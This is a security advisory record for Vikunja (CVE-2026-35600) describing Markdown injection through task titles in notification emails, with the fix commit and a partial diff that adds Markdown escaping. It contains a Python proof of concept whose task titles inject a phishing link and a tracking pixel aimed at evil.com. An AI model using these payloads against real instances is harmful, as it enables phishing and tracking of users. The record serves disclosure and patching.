# GHSA-45Q4-X4R9-8FQJ

repo: go-vikunja/vikunja

summary: Vikunja has HTML Injection via Task Titles in Overdue Email Notifications

aliases: ['CVE-2026-35600']

severity: MODERATE

evidence: blame blamed_lines=1 files=['pkg/models/notifications.go']

intro: 5f795bb531eefb1ada2d4597a47074af0e8fbc90

intro_subject: fix: self-assignment notification to use "themselves" instead of repeating username (#1836)

intro_date: 2025-11-17T23:07:48+00:00

fix: 0f3730d045f20e261e3cdfc6d93c325653395b64

affected: [
  {
    "package": {
      "ecosystem": "Go",
      "name": "code.vikunja.io/api"
    },
    "ranges": [
      {
        "type": "ECOSYSTEM",
        "events": [
          {
            "introduced": "0"
          },
          {
            "fixed": "2.3.0"
          }
        ]
      }
    ],
    "database_specific": {
      "last_known_affected_version_range": "<= 2.2.2"
    }
  }
]

DETAILS:
## Summary

Task titles are embedded directly into Markdown link syntax in overdue email notifications without escaping Markdown special characters. When rendered by goldmark and sanitized by bluemonday (which allows `<a>` and `<img>` tags), injected Markdown constructs produce phishing links and tracking pixels in legitimate notification emails.

## Details

The overdue task notification at `pkg/models/notifications.go:360` constructs a Markdown list entry:

```go
overdueLine += `* [` + task.Title + `](` + config.ServicePublicURL.GetString() + "tasks/" + strconv.FormatInt(task.ID, 10) + `) ...`
```

The task title is placed inside Markdown link syntax `[TITLE](URL)`. A title containing `]` and `[` breaks the link structure. The assembled Markdown is converted to HTML by goldmark at `pkg/notifications/mail_render.go:214`, then sanitized by bluemonday's UGCPolicy. Since UGCPolicy intentionally allows `<a href>` and `<img src>` with http/https URLs, the injected links and images survive sanitization and reach the email recipient.

The same pattern affects multiple notification types at `notifications.go` lines 72, 176, 227, and 318.

## Proof of Concept

Tested on Vikunja v2.2.2 with SMTP enabled (MailHog as sink).

```python
import requests

TARGET = "http://localhost:3456"
API = f"{TARGET}/api/v1"

token = requests.post(f"{API}/login",
    json={"username": "alice", "password": "Alice1234!"}).json()["token"]
h = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

proj = requests.put(f"{API}/projects", headers=h, json={"title": "Shared"}).json()

# create task with markdown injection in title + past due date
requests.put(f"{API}/projects/{proj['id']}/tasks", headers=h, json={
    "title": 'test](https://evil.com) [Click to verify your account',
    "due_date": "2026-03-26T00:00:00Z"})

# create task with tracking pixel injection
requests.put(f"{API}/projects/{proj['id']}/tasks", headers=h, json={
    "title": '![](https://evil.com/track.png?user=bob)',
    "due_date": "2026-03-26T00:00:00Z"})

# enable overdue reminders for the user
requests.post(f"{API}/user/settings/general", headers=h, json={
    "email_reminders_enabled": True,
    "overdue_tasks_reminders_enabled": True,
    "overdue_tasks_reminders_time": "09:00"})

# wait for the overdue notification cron to fire, then inspect the email
```

The overdue notification email HTML contains:
```html
<li>
  <a href="https://evil.com">test</a>
  <a href="http://vikunja.example/tasks/5"

REFS:
- WEB https://github.com/go-vikunja/vikunja/security/advisories/GHSA-45q4-x4r9-8fqj
- ADVISORY https://nvd.nist.gov/vuln/detail/CVE-2026-35600
- WEB https://github.com/go-vikunja/vikunja/pull/2580
- WEB https://github.com/go-vikunja/vikunja/commit/0f3730d045f20e261e3cdfc6d93c325653395b64
- PACKAGE https://github.com/go-vikunja/vikunja
- WEB https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0

INTRO_LOG:
5f795bb531eefb1ada2d4597a47074af0e8fbc90
Copilot <198982749+Copilot@users.noreply.github.com>
2025-11-17T23:07:48+00:00
fix: self-assignment notification to use "themselves" instead of repeating username (#1836)

When a user assigns a task to themselves, notifications to other users now
correctly say "User A assigned Task #123 to themselves" instead of
"User A assigned Task #123 to User A"

Co-authored-by: copilot-swe-agent[bot] <198982749+Copilot@users.noreply.github.com>
Co-authored-by: kolaente <13721712+kolaente@users.noreply.github.com>


INTRO_STAT:
 pkg/i18n/lang/en.json       | 4 +++-
 pkg/models/notifications.go | 8 ++++++++
 2 files changed, 11 insertions(+), 1 deletion(-)


INTRO_DIFF_OVERLAP:
diff --git a/pkg/models/notifications.go b/pkg/models/notifications.go
index bf7c17d9f..bf61df46a 100644
--- a/pkg/models/notifications.go
+++ b/pkg/models/notifications.go
@@ -142,6 +142,14 @@ func (n *TaskAssignedNotification) ToMail(lang string) *notifications.Mail {
 			Action(i18n.T(lang, "notifications.common.actions.open_task"), n.Task.GetFrontendURL())
 	}
 
+	// Check if the doer assigned the task to themselves
+	if n.Doer.ID == n.Assignee.ID {
+		return notifications.NewMail().
+			Subject(i18n.T(lang, "notifications.task.assigned.subject_to_others_self", n.Task.Title, n.Task.GetFullIdentifier(), n.Doer.GetName())).
+			Line(i18n.T(lang, "notifications.task.assigned.message_to_others_self", n.Doer.GetName())).
+			Action(i18n.T(lang, "notifications.common.actions.open_task"), n.Task.GetFrontendURL())
+	}
+
 	return notifications.NewMail().
 		Subject(i18n.T(lang, "notifications.task.assigned.subject_to_others", n.Task.Title, n.Task.GetFullIdentifier(), n.Assignee.GetName())).
 		Line(i18n.T(lang, "notifications.task.assigned.message_to_others", n.Doer.GetName(), n.Assignee.GetName())).


FIX_LOG:
0f3730d045f20e261e3cdfc6d93c325653395b64
kolaente <k@knt.li>
2026-04-09T15:44:04+00:00
fix(notifications): escape markdown in user-controlled strings in email lines

Task titles, project titles, team names, doer/assignee names, and API
token titles were interpolated raw into Line(...) calls whose content is
rendered to HTML by goldmark and then sanitized with bluemonday UGCPolicy.
UGCPolicy intentionally allows safe <a href> and <img src> with
http/https URLs, so a title containing Markdown link or image syntax
would survive sanitization as a working phishing link or tracking pixel
in a legitimate Vikunja email.

Introduce notifications.EscapeMarkdown, which prefixes every CommonMark
§2.4 backslash-escapable ASCII punctuation character — including '<' so
autolinks like `<https://evil.com>` are neutralized before reaching
goldmark — with a backslash. Apply it to every user-controlled argument
of every Line(...) call in pkg/models that feeds into an i18n template,
and to the hand-built "* [title](url) (project)" Markdown link in the
overdue-tasks digest notification.

Also escape the migration error string in MigrationFailedNotification,
an additional sink not listed in the advisory (error messages can carry
user-controlled content from the external migration source).

Subject(...), Greeting(...), and CreateConversationalHeader(...) are
left unchanged: Subject is passed directly to the mail library and is
not markdown-rendered, Greeting is rendered via html/template's built-in
HTML escaping without markdown, and the conversational header is
sanitized as raw HTML by bluemonday in mail_render.go.

Fixes GHSA-45q4-x4r9-8fqj.



FIX_STAT:
 pkg/models/api_tokens_expiry_notification.go   |   4 +-
 pkg/models/notifications.go                    |  18 ++---
 pkg/models/notifications_test.go               |  72 ++++++++++++++++++
 pkg/modules/migration/handler/notifications.go |   2 +-
 pkg/notifications/markdown_escape.go           |  41 ++++++++++
 pkg/notifications/markdown_escape_test.go      | 101 +++++++++++++++++++++++++
 6 files changed, 226 insertions(+), 12 deletions(-)


FIX_DIFF_OVERLAP:
diff --git a/pkg/models/notifications.go b/pkg/models/notifications.go
index 252f754fb..9e21e78db 100644
--- a/pkg/models/notifications.go
+++ b/pkg/models/notifications.go
@@ -62,7 +62,7 @@ func (n *ReminderDueNotification) ToMail(lang string) *notifications.Mail {
 		To(n.User.Email).
 		Subject(i18n.T(lang, "notifications.task.reminder.subject", n.Task.Title, n.Project.Title)).
 		Greeting(i18n.T(lang, "notifications.greeting", n.User.GetName())).
-		Line(i18n.T(lang, "notifications.task.reminder.message", n.Task.Title, n.Project.Title)).
+		Line(i18n.T(lang, "notifications.task.reminder.message", notifications.EscapeMarkdown(n.Task.Title), notifications.EscapeMarkdown(n.Project.Title))).
 		Action(i18n.T(lang, "notifications.common.actions.open_task"), config.ServicePublicURL.GetString()+"tasks/"+strconv.FormatInt(n.Task.ID, 10)).
 		Line(i18n.T(lang, "notifications.common.have_nice_day"))
 }
@@ -166,7 +166,7 @@ func (n *TaskAssignedNotification) ToMail(lang string) *notifications.Mail {
 			From(n.Doer.GetNameAndFromEmail()).
 			Subject(i18n.T(lang, "notifications.task.assigned.subject_to_assignee", n.Task.Title, n.Task.GetFullIdentifier())).
 			Greeting(i18n.T(lang, "notifications.greeting", n.Target.GetName())).
-			Line(i18n.T(lang, "notifications.task.assigned.message_to_assignee", n.Doer.GetName(), n.Task.Title)).
+			Line(i18n.T(lang, "notifications.task.assigned.message_to_assignee", notifications.EscapeMarkdown(n.Doer.GetName()), notifications.EscapeMarkdown(n.Task.Title))).
 			Action(i18n.T(lang, "notifications.common.actions.open_task"), n.Task.GetFrontendURL()).
 			IncludeLinkToSettings(lang)
 	}
@@ -177,7 +177,7 @@ func (n *TaskAssignedNotification) ToMail(lang string) *notifications.Mail {
 			From(n.Doer.GetNameAndFromEmail()).
 			Subject(i18n.T(lang, "notifications.task.assigned.subject_to_others_self", n.Task.Title, n.Task.GetFullIdentifier(), n.Doer.GetName())).
 			Greeting(i18n.T(lang, "notifications.greeting", n.Target.GetName())).
-			Line(i18n.T(lang, "notifications.task.assigned.message_to_others_self", n.Doer.GetName())).
+			Line(i18n.T(lang, "notifications.task.assigned.message_to_others_self", notifications.EscapeMarkdown(n.Doer.GetName()))).
 			Action(i18n.T(lang, "notifications.common.actions.open_task"), n.Task.GetFrontendURL()).
 			IncludeLinkToSettings(lang)
 	}
@@ -187,7 +187,7 @@ func (n *TaskAssignedNotification) ToMail(lang string) *notifications.Mail {
 		From(n.Doer.GetNameAndFromEmail()).
 		Subject(i18n.T(lang, "notifications.task.assigned.subject_to_others", n.Task.Title, n.Task.GetFullIdentifier(), n.Assignee.GetName())).
 		Greeting(i18n.T(lang, "notifications.greeting", n.Target.GetName())).
-		Line(i18n.T(lang, "notifications.task.assigned.message_to_others", n.Doer.GetName(), n.Assignee.GetName())).
+		Line(i18n.T(lang, "notifications.task.assigned.message_to_others", notifications.EscapeMarkdown(n.Doer.GetName()), notifications.EscapeMarkdown(n.Assignee.GetName()))).
 		Action(i18n.T(lang, "notifications.common.actions.open_task"), n.Task.GetFrontendURL()).
 		IncludeLinkToSettings(lang)
 }
@@ -217,7 +217,7 @@ type TaskDeletedNotification struct {
 func (n *TaskDeletedNotification) ToMail(lang string) *notifications.Mail {
 	return notifications.NewMail().
 		Subject(i18n.T(lang, "notifications.task.deleted.subject", n.Task.Title, n.Task.GetFullIdentifier())).
-		Line(i18n.T(lang, "notifications.task.deleted.message", n.Doer.GetName(), n.Task.Title, n.Task.GetFullIdentifier()))
+		Line(i18n.T(lang, "notifications.task.deleted.message", notifications.EscapeMarkdown(n.Doer.GetName()), notifications.EscapeMarkdown(n.Task.Title), notifications.EscapeMarkdown(n.Task.GetFullIdentifier())))
 }
 
 // ToDB returns the TaskDeletedNotification notification in a format which can be saved in the db
@@ -245,7 +245,7 @@ type ProjectCreatedNotification struct {
 func (n *ProjectCreatedNotification) ToMail(lang string) *notifications.Mail {
 	return notifications.NewMail().
 		Subject(

intro_is_ancestor_of_fix: True

tags_contain_intro_sample: []

tags_contain_fix_sample: []

tags_with_intro_not_fix_sample: []